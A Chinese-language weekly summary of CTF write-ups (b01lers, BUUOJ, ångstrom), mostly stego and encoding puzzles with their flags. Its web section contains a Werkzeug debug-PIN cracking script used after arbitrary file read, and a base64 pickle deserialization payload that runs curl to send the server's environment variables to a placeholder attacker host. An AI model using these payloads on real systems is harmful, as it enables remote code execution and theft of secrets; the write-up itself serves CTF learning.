---
# image bucket id
butterId: 4df72543-170c-4dff-a021-5bc0cff9f636
---

# Week2 Summary

## What have I done

- b01lers CTF WriteUp Partially
- BUUOJ 刷题 WriteUps
- ångstrom CTF WriteUps Pending

## [WriteUp] How did I accomplish these things

### Web

#### gdpr

查看页面源代码可以得到如下信息。

```html
<a href="/flag_policy">Flag policy:</a>
```

定向到 `/flag_policy` 即可得 flag。

```flag
bctf{annoying_but_good?}
```

#### lorem_ipsum

##### 任意文件读取

GET 参数 `animal` 处代码逻辑可用报错带出。

```python
@app.route('/')
def index():
    f = request.args.get('animal', 'dogs')
    with open(f, 'r') as f:
        file_content = f.read(200)
    return """
    <blockquote>{}</blockquote>
...
```

可以知道此处存在任意文件读取，且仅可读取 200 长度的内容。尝试读取 `/proc/self/cmdline` 可得如下信息。

```bash
/usr/bin/python3 /home/loremipsum/loremipsum.py
```

同时尝试传入 `animal=flag` 可以得到内容而不是报错，猜测 flag 文件就存在当前目录下。下一步要做的就是突破文件读取长度限制。

##### Werkzeug Debug Console PIN Crack

> 参考：https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug

参考文章中有逆向 Werkzeug Debug Console 的 PIN 生成原理的内容，这里直接贴脚本。

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'web3_user',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

`/sys/class/net/ens33/address` 读取到 MAC 地址 `02:42:ac:1b:00:02` 并将其[转换](https://www.vultr.com/resources/mac-converter/)成十进制 `2485378547714`。`/proc/self/environ` 可以包含出 username 为 `loremipsum`。之前的报错中可以找到 flask 的运行文件的绝对路径 `/usr/local/lib/python3.6/dist-packages/flask/app.py`。

> ##### machine-id not found
>
> 使用 `boot-id + cgroup` 来代替所需的 machine-id。`/proc/sys/kernel/random/boot_id` 读出一个所需的 boot-id `b875f129-5ae6-4ab1-90c0-ae07a6134578`。`/proc/self/cgroup` 可以读到 cgroup，从中选一个与 boot-id 拼接起来得到如下内容。
>
> ```plain text
> b875f129-5ae6-4ab1-90c0-ae07a6134578e8c9f0084a3b2b724e4f2a526d60bf0a62505f38649743b8522a8c005b8334ae
> ```

将上述得到的内容填进脚本中运行可得 PIN 为 `126-739-410`。直接在报错页面解锁 Debug Shell 然后读取文件即可得到 flag。

![](https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617678191018.bd83098f3c53633a473db247b076ec5cc8f3bf77.png)

```flag
b0ctf{Fl4sK_d3buG_is_InseCure}
```

#### Pyjailgolf 1

题目给出的代码如下。

```python
line = input('>>> ')

flag="[REDACTED]"

if len(line) > 10:
    raise Exception()

try:
    eval(line)
except:
    pass
```

此时只需要使用报错带出 flag 即可，因此构造出 `help(flag)` 即可。

```bash
>>> help(flag) 
No Python documentation found for 'pctf{JusT_a5k_4_h3lP!}'.
Use help() to get the interactive help utility.
Use help(str) for help on the str class.
```

```flag
pctf{JusT_a5k_4_h3lP!}
```

#### Jar

附件中给出了如下源码。

```python
from flask import Flask, send_file, request, make_response, redirect
import random
import os

app = Flask(__name__)

import pickle
import base64

flag = os.environ.get('FLAG', 'actf{FAKE_FLAG}')

@app.route('/pickle.jpg')
def bg():
	return send_file('pickle.jpg')

@app.route('/')
def jar():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	return '<form method="post" action="/add" style="text-align: center; width: 100%"><input type="text" name="item" placeholder="Item"><button>Add Item</button><img style="width: 100%; height: 100%" src="/pickle.jpg">' + \
		''.join(f'<div style="background-color: white; font-size: 3em; position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;">{item}</div>' for item in items)

@app.route('/add', methods=['POST'])
def add():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	items.append(request.form['item'])
	response = make_response(redirect('/'))
	response.set_cookie('contents', base64.b64encode(pickle.dumps(items)))
	return response

app.run(threaded=True, host="0.0.0.0")
```

很容易知道 flag 位于环境变量中，且 Cookie 处存在 pickle 反序列化漏洞。构建出如下脚本生成 payload。

```python
import base64

data = b'''(S'curl -H "agent: `env`" YOUR_HOST'
ios
system
.'''
print(base64.b64encode(data))
```

将生成出来的 payload 拼接到 Cookie 当中发起请求，即可在监听端得到包含 flag 的响应。

![](https://butter.lumosary.workers.dev/images/archive/37d3a4ca-dd25-41ad-b20b-303404d2c7c8/1617627999120.5c3bc98804aac5f53c01f493b080aa8e3f6f2b47.png)

```flag
actf{you_got_yourself_out_of_a_pickle}
```

### Misc

#### NSNC

题目附件是一张图，仔细观察可以发现有分开的两半二维码，将其修正一下。

![](https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617544624997.be5f53c326a1ed3cb6d9946b1156cc3269edc882.png@300w)

![image-20210404215755317](https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617544675500.6a73bf006f5a53ad8c2096ab97716d215ce6850e.png@200w)

扫描二维码可以得到如下信息。

```plain text 
MJRXIZT3NZPWKZTGL52GKZLTL5RWC3TUL5RDGX3XGBZG4X3MNFVTGX3SMU2GYX3UGMZXG7I=
```

Base32 解码一次可得 flag。

```flag
bctf{n_eff_tees_cant_b3_w0rn_lik3_re4l_t33s}
```

#### Elfcraft

附件给出的是一堆 mcfunction 文件，将其使用指令拼接起来。

```bash
type *.mcfunction >> combination.mcfunction
```

观察其数据特征可知其中包含着三维坐标且 y 轴大部分为 -1。因此将 x, z 两个轴的内容用正则稍微处理后提取出来之后写个脚本尝试构建图片。

```plain text
/execute as @a\[scores={search=1}\] if block ~(\d{1,3}) ~-1 ~(\d{1,3}) minecraft:white_concrete run/
/scoreboard players add @a localChecks 1/
/execute as @a.*\n/
```

```python
import PIL

img = PIL.Image.new("RGB", (15, 1367), "white")
coords = open('...\\combination.mcfunction').read().split("\n")
for coordsLine in coords:
    x, y = coordsLine.split(' ')
    img.putpixel((int(x), int(y)), (16,63,145))
img.save("result.png")
```

得到的图片上有一些 hex 数据。

>result.png 太长了不是很好放👇
>
>https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617686622772.1c48fb58d955ad4e795f53033468e1def00db69b.png

将其中的内容转写，可得到如下内容。

```plain text
7F 45 4C 46 01 01 01 00 00 00 00 00 00 00 00 00
02 00 03 00 01 00 00 00 54 80 04 08 34 00 00 00
00 00 00 00 00 00 00 00 34 00 20 00 01 00 00 00
00 00 00 00 01 00 00 00 00 00 00 00 00 80 04 08
00 80 04 08 E4 00 00 00 E4 00 00 00 05 00 00 00
00 10 00 00 C7 04 24 00 00 00 00 C7 44 24 FC 00
00 00 00 C7 44 24 F8 00 00 00 00 C7 04 24 00 00
00 00 BA 01 00 00 00 89 E1 BB 00 00 00 00 B8 03
00 00 00 CD B0 0F B6 54 24 FC 0F B6 8A CB 80 04
08 0F B6 14 24 31 D1 89 4C 24 F8 BA 01 00 00 00
89 E1 83 E9 08 BB 01 00 00 00 B8 04 00 00 00 CD
80 8B 4C 24 FC 41 89 4C 24 FC 83 F9 19 7C C6 BB
00 00 00 00 B8 01 00 00 00 CD B0 00 01 16 04 19
0F 53 0C 51 01 10 03 56 04 16 3D 27 2E 24 01 10
56 04 16 1F
```

很容易得知这是个 ELF 文件，此时再使用 IDA 打开这个文件。可以看到其反编译代码中有如下几句。

```c
 do
{
  v5 = (unsigned __int8)retaddr ^ *((unsigned __int8 *)&loc_80480CB + (unsigned __int8)v6);
  v1 = sys_write(1, &v5, 1u);
  v3 = v6 + 1;
  v6 = v3;
}
```

可以推测使用了亦或的方法。因为数据在 `loc_80480CB` 的位置，因此将此处及其后面的内容提取出来，做亦或操作。

![](https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617687947254.eb44c22f6a137a8d0b9834285349510a24c442e7.png)

因为 flag 以 b 开头，且数据第一位为 `00`，因此尝试将提取出来的内容亦或字符 b。此时可以得到 flag。

```flag
bctf{m1n3cra4ft_ELFcr4ft}
```

#### Bars, Windchests, Vocals

>Hint! The problem gives you an actual flag, it is not just a long number.
>Hint! The long number you get *is* the flag (in a form that computers love). It is in bctf{...} format, all bells and whistles are included in it.

附件给出的是一个包含很多乐谱的 PDF 文件，在其最后一页可以发现如下内容。

![](https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617870522255.5f6a875934623950158379f8b6d6daa577e1a4f7.png)



搜索巴赫的作品可以发现一个 BWV 编号，类似如下内容。（这里作品编号太多了，参考了大佬的 [WriteUp](https://github.com/franfrancisco9/B01lers_CTF)）

```plain text 
Gib dich zufrieden BWV 510
Präludium und Fuge As-Dur BWV 862
Befiehl du deine Wege BWV 272
Prelude and Fugue in C major BWV 870
Praeludium et Fuga BWV 546
```

查找所给附件中所有作品的编号并对应罗马数字可以得到如下结果。

```plain text
I = 510
II = 862
III = 272
IV = 870
V = 546
VI = 146
VII = 189
VIII = 563
IX = 354 
X = 996
XI = 765
XII = 565
```

将所得的全部数字按照顺序连接起来得到如下内容。

```plain text
510862272870546146189563354996765565
```

使用 `long_to_bytes(510862272870546146189563354996765565).decode()` 即可得 flag。

```flag
bctf{JSB/rOcKs}
```

#### [DDCTF2018](╯°□°）╯︵ ┻━┻

题目给出的附件有如下内容。

```plain text
d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd
```

尝试用 CyberChef 的 `From Hex` 解码，得到了不可读的字符串，考虑到字符串本身可能经过了运算。猜测最后一个字符 `0xfd` 应该与 flag 的结尾也就是 `}` 字符相对应，也就是原本应该是 `0x7d`。因此尝试将此前得到的结果减去 `0x80`，得到了如下内容。

```plain text
recipe=From_Hex('None')SUB(%7B'option':'Hex','string':'0x80'%7D)
```

```flag
That was fast! The flag is: DDCTF{922ab9974a47cd322cf43b50610faea5}
```

```flag
DDCTF{922ab9974a47cd322cf43b50610faea5}
```

#### [SUCTF 2019]Game

可以在附件给出的代码中的 index.html 中找到如下内容。

```php
<?php echo "here is your flag:ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2===" ?>
```

使用 Base32 解码字符串后得到了假 flag `suctf{hAHaha_Fak3_F1ag}`，于是将分析转向图片。使用 StegSolve 可解得图片中包含的隐写内容。

![](https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617951898429.a16261b648a2027994036e9a6bbdb1f18e7354eb.png)

将其提取出来可以得到如下内容，推测其是 AES 加密之后的密文。

```plain text
U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==
```

使用之前得到的假 flag 作为 key 对密文进行 Triple DES 解密可得真正的 flag。

![image-20210409151553062](https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617952553631.29833ec1ff22a56cdedf21d6707ef9f8cc6ba3dc.png)

```flag
suctf{U_F0und_1t}
```

#### [GUET-CTF2019]虚假的压缩包

解压附件得到真实的压缩包和虚假的压缩包。虚假的压缩包是伪加密，将其 deFlags 修改成 0 即可解压其中的文件，得到如下内容。

```plain text
数学题
n = 33
e = 3
解26

-------------------------
答案是
```

很容易看出这是简单的 RSA。将 $n$ 分解为 $11 \times 3$ 可得其欧拉值为 $\rho{(n)} = (11 - 1) \times (3 - 1) = 20$，$d \times e \mod  20 \equiv 1$，算得 $d = 7.$ `pow(c,d,n) = pow(26,7,33) = 5`。因此得到了 `答案是5`。将其作为压缩包密码解压真实的压缩包。

解压得到了一张图片和一段文本。使用 010 editor 打开图片并运行 PNG 模板可以发现爆出了熟悉的 CRC Mismatch。尝试使用图片宽高爆破脚本修正宽高为 `('hex:', '0xc6', '0xf2')`，得到了如下图片。

![](https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617956195657.6508ef9faa1c65a9fc51d3d8a75b511f602ad1f6.png)

此时可知需要将得到的文本亦或 5，写个脚本来实现。

```python
text = open("亦真亦假", 'r').read()
result = open("result.txt", 'w')
[result.write(hex(int(i, 16) ^ 5)[2:]) for i in text]
```

使用脚本将文件中的内容处理过后再将得到的内容 `From Hex` 解码一次可以得到一个 Word 文档。将其打开后可以在文章末尾发现超出文本的红色波浪线。因此尝试将超出的部分的字体颜色调深，此时可以得到 flag。

![](https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617957812594.6e4ccd1e34330549961c4b6999ee0611377ca96d.png)

```flag
FLAG{_th2_7ru8_2iP_}
```

#### 蜘蛛侠呀

> 将你获得的明显信息md5加密之后以flag{xxx}的格式提交。

Wireshark 分析附件给出的流量包，跟踪 TCP 流 1 可以发现一个 `GET /no_flag.zip` 响应为 304 的请求。再分析 ICMP 协议的流量，可以发现其中包含着数据。使用 tshark `tshark -r .\out.pcap -T fields -e data > data.txt ` 将其中的数据提取出来。将提取得到的数据简单处理后用 CyberChef 通过 `Unique --> From Hex` 后可以得到一个以 `$$START$$-----BEGIN CERTIFICATE-----` 开头的文件。将 `$$START$$` 去除掉之后再将证书格式以及换行去掉后解 Base64 编码，可得一个压缩文档。解压之后可得一个十分卡顿的 GIF 图片，猜测含有时间隐写。

![](https://butter.lumosary.workers.dev/images/album/4df72543-170c-4dff-a021-5bc0cff9f636/1617986423582.528f41484ec1ecfecc3ba41bc4c244514ad46067.gif)

使用 `ImageMagick identify` 工具执行 `identify -verbose .\flag.gif ` 并将结果整理后可以得到如下信息。

```plain text
20 50 50 20 50 50 20 50 20 50 20 20 20 50 20 20 20 20 50 50 20 50 20 50 20 50 20 50 50 50 50 50 20 20 50 50 20 20 20 50 20 50 50 50 20 50 20 20 66 66
```

将最后的两个 `66` 去除，将 `20` 替换成 0，`50` 替换成 1。再二进制转字符串可得到 `mD5_1t`。将其 MD5 一次可以得到 `f0f1003afe4ae8ce4aa8e8487a8ab3b6`。

```flag
flag{f0f1003afe4ae8ce4aa8e8487a8ab3b6}
```

#### [ångstrom CTF]Archaic

做这题的时候先用 scp 将文件全部传到了自己的服务器上，直接执行指令 `tar -xzvf archive.tar.gz` 来解压附件。此时得到了一个报错。

```plain text
tar: flag.txt: implausibly old time stamp 1921-04-02 06:45:12
```

但是文件解压成功了，因此直接拿到了 flag。

```flag
actf{thou_hast_uncovered_ye_ol_fleg}
```

#### [ångstrom CTF]Fish

附件给出了一张透明的图片。使用 StegSolve 可以解出如下图片。

![](https://butter.lumosary.workers.dev/images/archive/37d3a4ca-dd25-41ad-b20b-303404d2c7c8/1617897752769.c83ffc0c0e95fe32c7a7ebd93b7df3ea80e3c2a8.png@200w)

```flag
actf{in_the_m0rning_laughing_h4ppy_fish_heads_in_th3_evening_float1ng_in_your_soup}
```

#### [INSHack2017]10-cl0v3rf13ld-lane-signal

修正所得附件的文件拓展名为 JPG，运行 010 editor 的模板可以很容易看到文件末尾有另外一张 PNG 文件。

![](https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618125315933.30c582c581d25d6803d4db40d46414761be08a2c.png)

将 PNG 文件提取出来得到下图。

![](https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618125452952.e5e59e90f471a44b4feeef64916213d8591aee6a.png)

![image-20210411151806582](https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618125486724.31cb9ea5717ed0e1c64e0135589a7144a02715bb.png)

在其左下角可以发现小红点，使用摩斯电码解码可得 `HELPME`。同时在图片的末尾还能发现一个音频文件。

![](https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618125682663.bc55fd1e1089fc806caa7e75db378b3ac9c87bc5.png)

将音频文件提取出来，使用 Audition 打开，可以发现明显的摩斯电码的痕迹，将其抄收下来。

![](https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618126304818.1ae93647f541cffaa6a7baebcdf7a0f7a49e71e5.png)

```plain text
.. -. ... .- -.--. -- ----- .-. ..... ...-- ..--.- .-- .---- .-.. .-.. ..--.- -. ...-- ...- ...-- .-. ..--.- ....- --. ...-- -.-.-- -.--.-
```

转码后整理即可得到 flag。

```flag
INSA{M0R53_W1LL_N3V3R_4G3!}
```

## Summary

打了两场比赛，但是还没有复现完，效率还是低的，不过题写得很开心。

